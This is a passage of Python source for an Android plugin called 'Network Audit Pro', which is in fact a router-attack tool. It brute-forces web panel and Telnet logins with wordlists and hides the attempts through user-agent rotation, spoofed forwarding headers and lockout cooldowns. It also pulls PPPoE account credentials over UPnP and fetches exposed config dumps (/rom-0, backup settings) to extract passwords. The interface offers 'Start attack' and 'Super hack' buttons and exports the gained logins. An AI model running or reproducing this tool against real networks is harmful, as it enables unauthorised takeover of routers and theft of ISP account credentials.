                # silence before the overall deadline is no reason to give up at once
                continue
            except Exception:
                break
            if not chunk:
                break
            buf += strip_telnet_iacs(chunk)
            tail = bytes(buf[-64:]).decode("latin-1", errors="replace").lower()
            if any(m in tail for m in markers):
                break
        return bytes(buf)

    def telnet_try_login(self, host, username, password, port=23, timeout=4.0):
        s = None
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            banner_buf = self._read_telnet_until(s, TELNET_LOGIN_MARKERS, timeout)
            banner = banner_buf.decode("latin-1", errors="replace").strip()
            s.sendall(("{}\r\n".format(username)).encode("latin-1", errors="replace"))
            pass_buf = self._read_telnet_until(s, TELNET_PASS_MARKERS + TELNET_LOGIN_MARKERS, timeout)
            pass_tail = pass_buf.decode("latin-1", errors="replace").lower()
            if any(m in pass_tail for m in TELNET_LOGIN_MARKERS) and not any(m in pass_tail for m in TELNET_PASS_MARKERS):
                # login prompt again — bad user
                return False, banner, "login_reprompt"
            s.sendall(("{}\r\n".format(password)).encode("latin-1", errors="replace"))
            final_buf = self._read_telnet_until(s, ("#", ">", "$", "]"), min(3.0, timeout))
            reply = final_buf.decode("latin-1", errors="replace")
            verdict = classify_telnet_reply(reply)
            if verdict == "success":
                return True, banner, reply.strip()[:80]
            return False, banner, reply.strip()[:80]
        except Exception as exc:
            return False, "", "conn_error: {}".format(exc)
        finally:
            self._safe_close_socket(s)

    def _probe_telnet(self):
        host = self.gateway
        if not host or "." not in host:
            return
        if self.running:
            # do not disturb an active brute force with extra connections
            self._log("Telnet skip: brute force already running", "SCAN")
            return
        for user, passwd in TELNET_CREDS:
            if self.stop_flag:
                break
            ok, banner, note = self.telnet_try_login(host, user, passwd, 23, min(3.0, float(self.timeout_seconds)))
            if ok:
                self._log("🎉 Telnet {}:{}: login '{}'/'{}' succeeded (banner: {})".format(
                    host, 23, user, passwd, (banner or "-")[:40]), "HIT")
                self.telnet_creds = (user, passwd)
                self._cross_apply_telnet_creds(user, passwd)
                return
            if note == "conn_error":
                self._log("Telnet {}: port closed or filtered".format(host), "SCAN")
                return
        self._log("Telnet: wordlist finished without success", "SCAN")

    def _cross_apply_telnet_creds(self, user, passwd):
        # Telnet creds often match the web admin — a single check, not brute force
        if self.running:
            return
        gen_snapshot = self._run_gen
        try:
            status_code, location, _, body, _ = self.http_request(
                self.gateway, self.port, "GET", "/", None,
                generate_basic_token(user, passwd), float(self.timeout_seconds)
            )
            if self.judge_response(status_code, location, body) == "hit" and self._verify_http_hit(
                self.gateway, self.port, "GET", "/", None,
                generate_basic_token(user, passwd), float(self.timeout_seconds), body
            ):
                self._log("Telnet credentials also work on the web panel {}:{}!".format(self.gateway, self.port), "HIT")
                with self.stats_lock:
                    if not self.found_creds and self._run_gen == gen_snapshot:
                        self.found_creds = (user, passwd, "basic")
                        self.found_flag = True
        except Exception:
            pass

    def probe_upnp_credentials(self, port=1900, timeout=1.5):
        # WANPPPConnection.GetUserName/GetPassword via una-broadcast SOAP yields the PPPoE account
        soap = (
            '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            '<s:Body><u:GetPPPAuthenticationCredentials '
            'xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"></u:GetPPPAuthenticationCredentials>'
            '</s:Body></s:Envelope>'
        )
        pkt_tpl = (
            "POST /ctl/IPConn HTTP/1.1\r\nHost: {}:{}\r\nSOAPACTION: \"urn:schemas-upnp-org:service:"
            "WANPPPConnection:1#GetPPPAuthenticationCredentials\"\r\nContent-Type: text/xml\r\n"
            "Content-Length: {}\r\nConnection: close\r\n\r\n{}"
        )
        sock = None
        got = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            packet = pkt_tpl.format(self.gateway, port, len(soap), soap)
            sock.sendto(packet.encode("utf-8"), (self.gateway, port))
            while True:
                data, _addr = sock.recvfrom(8192)
                if not data:
                    break
                text = data.decode("utf-8", errors="replace")
                user = re.search(r"<NewUsername>(.*?)</NewUsername>", text, re.DOTALL | re.IGNORECASE)
                passw = re.search(r"<NewPassword>(.*?)</NewPassword>", text, re.DOTALL | re.IGNORECASE)
                if user or passw:
                    user_v = user.group(1).strip() if user else ""
                    pass_v = passw.group(1).strip() if passw else ""
                    got.append((user_v, pass_v))
                    break
        except Exception:
            pass
        finally:
            self._safe_close_socket(sock)
        return got

    def _probe_leaked_configs(self):
        # try downloading the config and pulling passwords from the dump
        if self.running:
            self._log("Config checks skipped: brute force occupies the network", "SCAN")
            return
        for route in ("/rom-0", "/backup_settings_2.xml"):
            if self.stop_flag:
                return
            try:
                status_code, _, _, _body, full_text = self.http_request(
                    self.gateway, self.port, "GET", route, None, None,
                    float(self.timeout_seconds), evade=False
                )
            except Exception:
                continue
            if status_code != 200 or not full_text:
                continue
            sep = full_text.find("\r\n\r\n")
            raw = full_text[sep + 4:].encode("latin-1", errors="replace") if sep >= 0 else b""
            leaked = decode_rom0_secrets(raw)
            if not leaked:
                user_v, pass_v = extract_pppoe_credentials(full_text[sep + 4:] if sep >= 0 else "")
                if user_v and pass_v:
                    leaked = [(user_v, pass_v)]
            if leaked:
                for lv_u, lv_p in leaked[:3]:
                    self._log("Leaked data from {}: login '{}' password '{}'".format(route, lv_u, lv_p), "VULN")
                    if not self.found_creds:
                        self.vulns_found.append("Account from {}: {} / {}".format(route, lv_u, lv_p))

    # ------------------- Vulnerability probes -------------------

    def simple_probe(self, path):
        status_code, _, _, body, _ = self.http_request(
            self.gateway, self.port, "GET", path, None, None, float(self.timeout_seconds), evade=False
        )
        return status_code, body

    def probe_vulnerabilities(self):
        # guard against parallel runs: two probes would erase each other's list
        if getattr(self, "_probing", False):
            self._log("A vulnerability probe is already running — wait for it to finish", "INFO")
            return
        self._probing = True
        try:
            self._do_probe_vulnerabilities()
        finally:
            self._probing = False

    def _do_probe_vulnerabilities(self):
        self.vulns_found = []

        for route, description in KNOWN_ROUTES:
            status_code, body = self.simple_probe(route)
            if status_code in (200, 206) and body and len(body.strip()) > 30:
                self.vulns_found.append("{} — {}".format(route, description))
                self._log("Open without login: {}".format(route), "VULN")

        soap_body = (
            '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            '<u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"></u:GetStatusInfo>'
            '</s:Body></s:Envelope>'
        )
        upnp_packet = (
            "POST /ctl/IPConn HTTP/1.1\r\nHost: {}:1900\r\n"
            "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo\"\r\n"
            "Content-Type: text/xml\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}"
        ).format(self.gateway, len(soap_body), soap_body)
        udp_sock = None
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.settimeout(2.0)
            udp_sock.sendto(upnp_packet.encode("utf-8"), (self.gateway, 1900))
            data, _ = udp_sock.recvfrom(4096)
            if data:
                self.vulns_found.append("UPnP (port 1900) answers any request — WAN status is exposed")
                self._log("UPnP responds without restrictions", "VULN")
        except Exception:
            pass
        finally:
            self._safe_close_socket(udp_sock)

        telnet_sock = None
        try:
            telnet_sock = socket.create_connection((self.gateway, 23), timeout=min(2.0, float(self.timeout_seconds)))
            banner = telnet_sock.recv(512)
            telnet_sock.close()
            if banner:
                decoded = banner.decode("latin-1", errors="replace").strip().replace("\n", " ").replace("\r", "")
                self.vulns_found.append("Telnet (port 23) is open, banner: '{}' — the same wordlist may work".format(decoded[:60]))
                self._log("Telnet open with banner: {}".format(decoded[:60]), "VULN")
        except Exception:
            pass
        finally:
            if telnet_sock is not None:
                self._safe_close_socket(telnet_sock)

        upnp_creds = self.probe_upnp_credentials()
        if upnp_creds:
            for lu, lp in upnp_creds:
                self._log("UPnP exposed a PPPoE account: '{}' / '{}'".format(lu, lp), "VULN")
                self.vulns_found.append("PPPoE account via UPnP: {} / {}".format(lu, lp))

        self._probe_telnet()
        self._probe_leaked_configs()

        if not self.vulns_found:
            self._log("No known open endpoints found (MAC filter or patched firmware)", "INFO")
        self.refresh()

    # ------------------- UI timer -------------------

    def _finalize_run_summary(self, outcome):
        # one summary per run: speed, duration, attempts
        if getattr(self, "last_run_summary", None) is not None:
            return
        elapsed = time.time() - getattr(self, "_brute_started_ts", 0.0)
        if elapsed <= 0:
            elapsed = 0.1
        avg_pps = int(self.tried_count / elapsed) if (self.tried_count and elapsed > 0) else 0
        self.last_run_summary = {
            "attempts": self.tried_count,
            "duration_s": max(1, int(round(elapsed))),
            "avg_pps": avg_pps,
            "outcome": outcome,
        }

    def _ui_progress_timer(self):
        gen = getattr(self, "_run_gen", 0)
        last_total = 0
        last_time = time.time()
        while self.running and not self.stop_flag and gen == self._run_gen:
            time.sleep(0.5)
            if gen != self._run_gen:
                return
            now = time.time()
            dt = now - last_time
            last_time = now
            with self.stats_lock:
                current = self.tried_count
            if dt > 0:
                self.pps = int((current - last_total) / dt)
                last_total = current
            if current >= self.expected_total and not self.found_flag:
                break
            with self._cursor_lock:
                exhausted = self._cursor >= self.expected_total
            if exhausted or self.brute_done or self.found_flag:
                break
            self.refresh()
        if gen != getattr(self, "_run_gen", gen):
            return
        if self.found_creds:
            self.running = False
            self.status_line = "Done! Access gained, see the panel above."
            self._finalize_run_summary("success")
        elif not self.stop_flag or self.tried_count >= self.expected_total:
            self.running = False
            self.status_line = "List exhausted — password not found. Run \"Vulnerabilities only\"."
            self._log("Brute force finished: wordlist exhausted without success", "WARN")
            self._finalize_run_summary("exhausted")
        self.refresh()

    # ------------------- Start / stop -------------------

    def _run_recon(self):
        status_code, location, _, body, full_text = self.http_request(
            self.gateway, self.port, "GET", "/", None, None, float(self.timeout_seconds), evade=False
        )
        # classic nginx routers: the HTTP port serves only a 302 to https://host/.
        # once we move to 443 and redo recon over TLS
        if status_code in (301, 302) and str(location or "").lower().startswith("https://") and self.port != 443:
            loc_host = ""
            try:
                loc_host = urllib.parse.urlsplit(location).hostname or ""
            except Exception:
                loc_host = ""
            if loc_host in ("", self.gateway):
                self.port = 443
                self.set_setting("port", 443)
                self._log("The panel answers only over HTTPS (302 to https://{}). Switched to 443 (TLS).".format(loc_host or self.gateway), "SCAN")
                self.refresh()
                return self._run_recon()
        if status_code <= 0:
            return False
        # LuCI serves a landing page with <meta http-equiv=refresh url=cgi-bin/luci/>:
        # one hop to the internal target — the panel/login is already there
        meta_m = None
        try:
            meta_m = re.search(
                r'(?i)http-equiv\s*=\s*["\']?refresh["\']?[^>]*?url\s*=\s*["\']?([^"\'>\s;]+)',
                full_text or ""
            )
        except Exception:
            meta_m = None
        if meta_m:
            target = meta_m.group(1)
            if not target.lower().startswith("http"):
                target = "/" + target.lstrip("/").lstrip()
                try:
                    _s2, _l2, _ck2, _b2, full_text = self.http_request(
                        self.gateway, self.port, "GET", target, None, None, float(self.timeout_seconds), evade=False
                    )
                    self._log("Meta redirect on the landing page: the panel is probably at {}".format(target), "SCAN")
                except Exception:
                    pass
        self.panel_title = self.parse_title(full_text)
        self.brand_hint = self.detect_brand_from_page(
            self.panel_title,
            self.extract_server_header(full_text),
            full_text.lower()
        )
        realm_raw = self.extract_realm(full_text)
        www_header = self.extract_www_authenticate(full_text)
        # reset the previous state: without a fresh 401 the scheme stays Basic
        self.auth_scheme = "basic"
        self.digest_params = None
        self.auth_realm = ""
        if www_header.lower().startswith("digest"):
            self.auth_scheme = "digest"
            self.digest_params = parse_digest_challenge(www_header)
            self.auth_realm = self.digest_params.get("realm", "")
            self._log("Digest Auth protection (MD5), Realm: {}".format(self.auth_realm), "SCAN")
        elif realm_raw:
            self.auth_scheme = "basic"
            self.digest_params = None
            self.auth_realm = realm_raw
            self._log("Basic Auth protection, Realm: {}".format(realm_raw), "SCAN")
        action = self.find_form_action(full_text)
        if action:
            self._log("Found an HTML login form: POST {}".format(action), "SCAN")
        self._log("Panel identified as {}. Title: {}".format(self.brand_hint, (self.panel_title or "-")[:60]), "SCAN")
        self._detected_form_action = action
        # dynamic field names of this specific router
        fields = extract_form_fields(full_text)
        self._form_fields = fields if fields[1] else None
        return True

    def _merge_priority_pairs(self, pairs, candidates):
        existing = set(candidates)
        addition = [pair for pair in pairs if pair not in existing]
        return addition + candidates

    def _auto_detect_gateway_now(self):
        ip = self._detect_local_ip_cached()
        if not ip or ip.count(".") != 3:
            self.toast("❌ Failed to determine your IP")
            return
        guessed = ".".join(ip.split(".")[:-1]) + ".1"
        self.gateway = guessed
        self.set_setting("gateway", self.gateway)
        self._log("Gateway auto-detected: {}".format(guessed), "OK")
        self.toast("🎯 Gateway: {}".format(guessed))
        self.refresh()

    def _run_passhunt(self):
        if self.running:
            self._stop_passhunt()
            return

        # new run: old workers (may hang in a socket timeout for up to ~2*timeout)
        # will see the generation change and exit without touching the new run's shared cursor
        self._run_gen = getattr(self, "_run_gen", 0) + 1

        gateway_clean = str(self.gateway or "").strip()
        if not gateway_clean or "." not in gateway_clean or gateway_clean.startswith("198.18."):
            self.toast("❌ Specify a correct gateway IP (no VPN Fake-IP)")
            return

        if self._detect_vpn():
            self._log("⚠️ VPN detected: the gateway may be wrong and attacks may miss the router", "WARN")
            self.toast("🛡 Warning: VPN is active!")

        self.running = True
        self.stop_flag = False
        self.found_flag = False
        self.brute_done = False
        for old_thread in self.threads:
            if old_thread.is_alive():
                try:
                    old_thread.join(timeout=1.0)
                except Exception:
                    pass
        self.found_creds = None
        self.tried_count = 0
        self.fail_count = 0
        self.lockout_count = 0
        self.evade_pauses = 0
        self.pps = 0
        self._consec_lockouts = 0
        self._cooldown_until = 0.0
        self.status_line = "Panel recon..."
        self.refresh()

        probe_ok = self._run_recon()
        if not probe_ok:
            self._log("No connection to {}:{}.".format(self.gateway, self.port), "ERR")
            self.status_line = "No connection to the target."
            self.running = False
            self.refresh()
            self.toast("❌ The router does not answer on {}:{}".format(self.gateway, self.port))
            return

        candidates = self._build_candidates()

        realm_pairs = self.fetch_realms_dictionary(self.auth_realm) if self.auth_realm else []
        if realm_pairs:
            candidates = self._merge_priority_pairs(realm_pairs, candidates)

        brand_pairs = BRAND_CREDS.get(self.brand_hint, [])
        if brand_pairs:
            candidates = self._merge_priority_pairs(brand_pairs, candidates)

        form_path = getattr(self, "_detected_form_action", "") or ""
        if not form_path and self.brand_hint in BRAND_LOGIN_PATHS:
            form_path = BRAND_LOGIN_PATHS[self.brand_hint][0]
        if not form_path:
            form_path = "/"

        with self.stats_lock:
            self._cursor = 0

        self.expected_total = len(candidates)
        self._brute_started_ts = time.time()
        self.last_run_summary = None
        imported_count = self._imported_pairs_count
        default_count = len(default_dict_pairs())
        evade_info = "UA rotation: {}, delay {} ms, cooldown {} s".format(
            "on" if self.evasion_ua else "off",
            self.attempt_delay_ms,
            self.lockout_pause_s,
        )
        self._log("Attack {}:{} · mode {} · threads {} · {} combinations (built-in wordlist: {}, custom: {}) · {}".format(
            self.gateway, self.port, self.mode, self.num_threads,
            len(candidates), default_count, imported_count, evade_info
        ), "BRUTE")
        self.status_line = "Brute force running..."

        self.threads = []
        threading.Thread(target=self._ui_progress_timer, daemon=True).start()

        threads_to_start = max(1, min(int(self.num_threads), 32))
        for i in range(threads_to_start):
            try:
                t = threading.Thread(
                    target=self.worker_loop,
                    args=(i, candidates, self.mode, form_path),
                    daemon=True
                )
                t.start()
                self.threads.append(t)
            except Exception as err:
                self._log("Thread creation error: {}".format(err), "ERR")
                break

        self.refresh()

    def _stop_passhunt(self):
        if not self.running:
            return
        self.stop_flag = True
        self.running = False
        self.status_line = "Stopped by the user."
        self._finalize_run_summary("stopped")
        self._log("⏹ Stop. Attempts made: {}".format(self.tried_count), "INFO")
        self.toast("Stopping brute force and looking for vulnerabilities...")
        threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()
        self.refresh()

    # ------------------- Report -------------------

    def _export_report(self):
        lines = [
            "📋 === REPORT Network Audit Pro v{} ===".format(__version__),
            "Author: {}".format(__author__),
            "Target: {}:{} · mode {} · threads {} · timeout {}s".format(
                self.gateway, self.port, self.mode, self.num_threads, self.timeout_seconds
            ),
            "Detection evasion: UA rotation {}, XFF {}, base delay {} ms, cooldown {} s (pauses per run: {})".format(
                "on" if self.evasion_ua else "off",
                "on" if self.evasion_xff else "off",
                self.attempt_delay_ms,
                self.lockout_pause_s,
                self.evade_pauses,
            ),
            "--- Panel ---",
            "Detected brand: {}".format(self.brand_hint or "-"),
            "Page title: {}".format(self.panel_title or "-"),
            "Basic realm: {}".format(self.auth_realm or "-"),
            "--- Access check result ---"
        ]
        if self.found_creds:
            u, p, m = self.found_creds
            lines.append("✅ ACCESS GAINED")
            lines.append("Login:  {}".format(u if u else "(empty)"))
            lines.append("Password: {}".format(p if p else "(empty)"))
            lines.append("Method: {}".format(AUTH_MODE_LABELS.get(m, "HTML form POST")))
        elif self.tried_count > 0:
            lines.append("❌ No password found in {} attempts".format(self.tried_count))
        else:
            lines.append("ℹ️ Brute force has not run yet")
        lines.append("Stats: attempts {} · failures {} · lockouts {}".format(
            self.tried_count, self.fail_count, self.lockout_count
        ))
        imported_pairs_count = self._imported_pairs_count
        lines.append("Custom dictionary: {} pairs".format(imported_pairs_count))
        lines.append("--- Passwordless vulnerabilities ---")
        if self.vulns_found:
            for item in self.vulns_found:
                lines.append("• {}".format(item))
        else:
            lines.append("• None found or the target is closed by a filter")
        lines.append("=" * 48)
        self.generated_report_text = "\n".join(lines)

        saved_path = ""
        try:
            stamp = time.strftime("%Y%m%d_%H%M%S")
            saved_path = "/sdcard/Download/net_audit_report_{}.txt".format(stamp)
            with open(saved_path, "w", encoding="utf-8") as f:
                f.write(self.generated_report_text)
            self._log("Report saved to Download", "OK")
        except Exception as exc:
            self._log("Failed to save the file: {}".format(exc), "ERR")

        copied = self._copy_text_to_clipboard(self.generated_report_text)
        if copied:
            self._log("Report copied to the clipboard", "OK")

        self.toast("📤 Report ready{}".format("" if copied else " (clipboard unavailable)"))
        self.navigate("report")
        self.refresh()

    def _copy_text_to_clipboard(self, text):
        try:
            from com.chaquo.python import Python
            from android.content import Context, ClipData
            app_context = Python.getPlatform().getApplication()
            clipboard = app_context.getSystemService(Context.CLIPBOARD_SERVICE)
            clip = ClipData.newPlainText("Network Audit Pro", str(text or ""))
            clipboard.setPrimaryClip(clip)
            return True
        except Exception:
            return False

    def _copy_credentials(self):
        if not self.found_creds:
            self.toast("No found access")
            return
        u, p, _m = self.found_creds
        ok = self._copy_text_to_clipboard("{}:{}".format(u, p))
        self.toast("🔑 Login:password copied" if ok else "Clipboard unavailable")

    # ------------------- Network diagnostics -------------------

    def _test_ping(self):
        gateway_clean = str(self.gateway or "").strip()
        if not gateway_clean or "." not in gateway_clean:
            self.toast("❌ Set a correct IP")
            return
        self.status_line = "Checking connectivity..."
        self.refresh()

        def ping_worker():
            try:
                started = time.time()
                s = socket.create_connection((gateway_clean, self.port), timeout=float(min(self.timeout_seconds, 5)))
                if self.port in (23, 21, 22, 443):
                    # for Telnet/FTP/SSH/443 a bare TCP-connect — an HTTP GET is not for them
                    elapsed = round((time.time() - started) * 1000, 1)
                    self._safe_close_socket(s)
                    self.ping_status_text = "✅ Responds in {} ms (TCP)".format(elapsed)
                    self._log("Gateway {}:{} reachable ({} ms, TCP without a request)".format(gateway_clean, self.port, elapsed), "OK")
                    self.refresh()
                    return
                s.sendall(b"GET / HTTP/1.1\r\nHost: probe\r\nConnection: close\r\n\r\n")
                s.recv(256)
                elapsed = round((time.time() - started) * 1000, 1)
                self._safe_close_socket(s)
                self.ping_status_text = "✅ Responds in {} ms".format(elapsed)
                self._log("Gateway {}:{} reachable ({} ms)".format(gateway_clean, self.port, elapsed), "OK")
            except Exception as exc:
                self.ping_status_text = "❌ No reply: {}".format(exc)
                self._log("Target {}:{} unreachable: {}".format(gateway_clean, self.port, exc), "ERR")
            self.refresh()

        threading.Thread(target=ping_worker, daemon=True).start()

    def _run_port_scan(self):
        self.scan_results_txt = "Scanning ports..."
        self.refresh()

        def scan_worker():
            opened = []
            for port_num, service_name in ADMIN_PORTS:
                if self.stop_flag:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.0)
                    res = s.connect_ex((self.gateway, port_num))
                    self._safe_close_socket(s)
                    if res == 0:
                        opened.append((port_num, service_name))
                except Exception:
                    pass
            if opened:
                shown = ", ".join(["{} ({})".format(port_num, service_name) for port_num, service_name in opened])
                self.scan_results_txt = "Open ports: " + shown + (" (443: TLS not checked)" if 443 in opened else "")
                self._log("Gateway open ports: {}".format(shown), "OK")
                if self.port not in [p for p, _ in opened]:
                    # auto-switch only within the HTTP family; Telnet/FTP/443(TLS) do not qualify
                    http_ports = [p for p, name in opened if name in ("HTTP", "Web-Alt")]
                    if http_ports:
                        self.port = http_ports[0]
                        self.set_setting("port", self.port)
                        self._log("Main port switched to {}".format(self.port), "OK")
            else:
                self.scan_results_txt = "No open TCP ports found"
                self._log("Port scanner: nothing open", "WARN")
            self.refresh()

        threading.Thread(target=scan_worker, daemon=True).start()

    def _detect_local_ip_cached(self):
        now = time.time()
        if self._cached_ip and (now - self._cached_ip_time) < 15.0:
            return self._cached_ip
        ip = ""
        try:
            device_json = self.api.getDevice()
            data = json.loads(str(device_json)) if isinstance(device_json, str) else device_json
            if isinstance(data, dict):
                wifi_info = data.get("wifi", {}) or {}
                raw_ip = wifi_info.get("ip") or wifi_info.get("address")
                if isinstance(raw_ip, str) and raw_ip.strip() and raw_ip.strip() not in ("—", "-", "null", "None"):
                    ip = raw_ip.strip()
        except Exception:
            ip = ""
        if not ip or ip == "127.0.0.1":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.4)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                self._safe_close_socket(s)
            except Exception:
                ip = ""
        self._cached_ip = ip
        self._cached_ip_time = now
        return ip

    def _init_auto_gateway(self):
        ip = self._detect_local_ip_cached()
        if ip and ip.count(".") == 3 and not ip.startswith("198.18.") and ip != "127.0.0.1":
            guessed = ".".join(ip.split(".")[:-1]) + ".1"
            if not self.gateway:
                self.gateway = guessed
                self.set_setting("gateway", self.gateway)
                self._log("Gateway auto-detected from your IP: {}".format(guessed), "OK")

    def _detect_wifi_connected(self):
        ip = self._detect_local_ip_cached()
        if not ip or ip == "127.0.0.1":
            return False
        return (
            ip.startswith("192.168.") or ip.startswith("10.")
            or ip.startswith("172.16.") or ip.startswith("172.17.")
            or ip.startswith("172.18.") or ip.startswith("172.19.")
            or ip.startswith("172.20.") or ip.startswith("172.21.")
            or ip.startswith("172.22.") or ip.startswith("172.23.")
            or ip.startswith("172.24.") or ip.startswith("172.25.")
            or ip.startswith("172.26.") or ip.startswith("172.27.")
            or ip.startswith("172.28.") or ip.startswith("172.29.")
            or ip.startswith("172.30.") or ip.startswith("172.31.")
        )

    def _recheck_panel(self):
        def recon_worker():
            try:
                ok = self._run_recon()
                if not ok:
                    self._log("Recon failed: the target does not answer", "ERR")
            except Exception as err:
                self._log("Recon error: {}".format(err), "ERR")
            self.refresh()

        threading.Thread(target=recon_worker, daemon=True).start()
        self.toast("🧠 Re-detecting the panel...")

    # ------------------- UI setters -------------------

    def _set_gateway(self, value):
        val = str(value or "").strip()
        if val:
            self.gateway = val
            self.set_setting("gateway", self.gateway)

    def _safe_int(self, value, default, minimum, maximum):
        try:
            return max(minimum, min(maximum, int(float(str(value).strip()))))
        except Exception:
            return default

    def _set_port(self, value):
        p = self._safe_int(value, 0, 1, 65535)
        if p:
            self.port = p
            self.set_setting("port", self.port)

    def _set_mode(self, new_mode):
        self.mode = new_mode
        self.set_setting("mode", new_mode)
        self.refresh()

    def _set_threads(self, value):
        self.num_threads = self._safe_int(value, self.num_threads, 1, 32)
        self.set_setting("num_threads", self.num_threads)
        self.refresh()

    def _set_timeout(self, value):
        self.timeout_seconds = self._safe_int(value, self.timeout_seconds, 1, 10)
        self.set_setting("timeout_seconds", self.timeout_seconds)
        self.refresh()

    def _set_stop_on_success(self, value):
        self.stop_on_success = bool(value)
        self.set_setting("stop_on_success", self.stop_on_success)
        self.refresh()

    def _set_evasion_ua(self, value):
        self.evasion_ua = bool(value)
        self.set_setting("evasion_ua", self.evasion_ua)
        self.refresh()

    def _set_evasion_xff(self, value):
        self.evasion_xff = bool(value)
        self.set_setting("evasion_xff", self.evasion_xff)
        self.refresh()

    def _set_attempt_delay(self, value):
        self.attempt_delay_ms = self._safe_int(value, self.attempt_delay_ms, 0, 2000)
        self.set_setting("attempt_delay_ms", self.attempt_delay_ms)
        self.refresh()

    def _set_lockout_pause(self, value):
        self.lockout_pause_s = self._safe_int(value, self.lockout_pause_s, 0, 120)
        self.set_setting("lockout_pause_s", self.lockout_pause_s)
        self.refresh()

    def _set_custom_users(self, value):
        self.custom_users_text = str(value or "")
        self.set_setting("custom_users", self.custom_users_text)

    def _set_custom_passes(self, value):
        self.custom_passes_text = str(value or "")
        self.set_setting("custom_passes", self.custom_passes_text)

    def _dict_preview_pairs(self, text):
        # parse only when the text changes, not on every screen render
        text_key = str(text or "")
        cache = getattr(self, "_preview_cache", None)
        if cache is not None and (cache[0] is text_key or cache[0] == text_key):
            return cache[1]
        pairs = self._parse_dict_pairs(text_key)
        self._preview_cache = (text_key, pairs)
        return pairs

    def _recount_dict_pairs(self):
        # final count after a typing pause (debounce)
        try:
            self._imported_pairs_count = len(self._parse_dict_pairs(self.custom_dict_text))
            self._preview_cache = None
            self.refresh()
        except Exception:
            pass

    def _cancel_dict_parse_timer(self):
        timer = getattr(self, "_dict_parse_timer", None)
        if timer is not None:
            try:
                timer.cancel()
            except Exception:
                pass
            self._dict_parse_timer = None

    def _set_custom_dict_text(self, value):
        self.custom_dict_text = str(value or "")
        self._preview_cache = None
        self.set_setting("custom_dict_text", self.custom_dict_text)
        self._cancel_dict_parse_timer()
        # do not parse 1 MB on every keystroke — recount after a pause
        self._dict_parse_timer = threading.Timer(0.8, self._recount_dict_pairs)
        self._dict_parse_timer.daemon = True
        self._dict_parse_timer.start()

    def _set_manual_dict_path(self, value):
        self.manual_dict_path = str(value or "")
        self.set_setting("manual_dict_path", self.manual_dict_path)

    def _refresh_file_list(self):
        self._dict_scan_cache = ()
        self.toast("🔄 Rescanning storage...")
        self.refresh()

    def on_plugin_unload(self):
        # a generation change wakes workers stuck in socket reads
        self._run_gen = getattr(self, "_run_gen", 0) + 1
        self.stop_flag = True
        self.running = False
        self._cancel_dict_parse_timer()

    # ------------------- UI screens -------------------

    def screen_main(self, ui, api, state):
        wifi_ok = self._detect_wifi_connected()
        vpn_ok = self._detect_vpn()
        imported_count = self._imported_pairs_count

        children = []

        my_ip = self._detect_local_ip_cached() or "-"
        children.append(ui.card([
            ui.row([
                ui.icon("wifi", 34, tint="success" if wifi_ok else "warning"),
                ui.column([
                    ui.text("Wi-Fi connected" if wifi_ok else "Check Wi-Fi/LAN", "titleLarge"),
                    ui.text("Your IP: {} · Gateway: {} · Port: {}".format(
                        my_ip, self.gateway or "-", self.port
                    ), "bodyMedium"),
                ], spacing=2),
            ], spacing=12),
            ui.row(
                ([ui.chip("🛡 VPN active", True)] if vpn_ok else []) + [
                    ui.chip("Built-in: {} pairs".format(len(default_dict_pairs())), False),
                    ui.chip("Custom: {} pairs".format(imported_count), False),
                    ui.chip("v{}".format(__version__), False),
                ],
                spacing=6,
            ),
        ]))

        children.append(ui.card(ui.column([
            ui.row([
                ui.text("🎯 Attack target", "titleSmall"),
                ui.button("Settings", on_click=lambda: self.navigate("attack_settings"), style="text")
            ], fill_max_width=True),
            ui.row([
                ui.text_field(
                    value=str(self.gateway),
                    on_change=lambda v: self._set_gateway(v),
                    label="Gateway (router) IP",
                    single_line=True,
                    fill_max_width=True
                ),
                ui.button("🎯 Auto-IP", on_click=self._auto_detect_gateway_now, style="outlined")
            ], fill_max_width=True),
            ui.row([
                ui.button("⚡ Ping", on_click=self._test_ping, style="outlined"),
                ui.button("🔍 Ports", on_click=self._run_port_scan, style="outlined"),
                ui.button("♻️ Recon", on_click=self._recheck_panel, style="outlined")
            ], spacing=8, fill_max_width=True),
            ui.text(self.ping_status_text, "bodySmall"),
            ui.text(self.scan_results_txt, "bodySmall"),
            ui.text("Brand: {} · Realm: {} · Auth: {}".format(
                self.brand_hint or "unknown",
                self.auth_realm or "-",
                "Digest" if self.auth_scheme == "digest" else "Basic/form"
            ), "bodySmall")
        ], spacing=6)))

        children.append(ui.card(ui.column([
            ui.row([
                ui.text("🔤 Dictionaries", "titleSmall"),
                ui.button("Select", on_click=self._open_dict_screen, style="text")
            ], fill_max_width=True),
            ui.text("Built-in dictionary: {} pairs · Custom dictionary: {} pairs".format(
                len(default_dict_pairs()), imported_count
            ), "bodyMedium")
        ], spacing=4)))

        children.append(ui.card(ui.row([
            ui.column([
                ui.text("⚙️ Attack", "titleMedium"),
                ui.text("{} · threads {} · delay {} ms · stop-on-success: {}".format(
                    {"auto": "Auto", "basic": "Basic", "form": "Form"}.get(self.mode, self.mode),
                    self.num_threads, self.attempt_delay_ms,
                    "on" if self.stop_on_success else "off"
                ), "bodyMedium"),
            ], spacing=2),
            ui.button("Configure", on_click=lambda: self.navigate("attack_settings"), style="tonal")
        ], fill_max_width=True)))

        control_children = [
            ui.button(
                "🚀 Start attack" if not self.running else "⏹ Stop",
                on_click=self._run_passhunt,
                style="filled" if not self.running else "error",
                fill_max_width=True
            ),
            ui.button("🔓 Vulnerabilities only", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
            ui.button("💥 Super hack", on_click=self._super_hack_button, style="outlined", fill_max_width=True),
            ui.row([
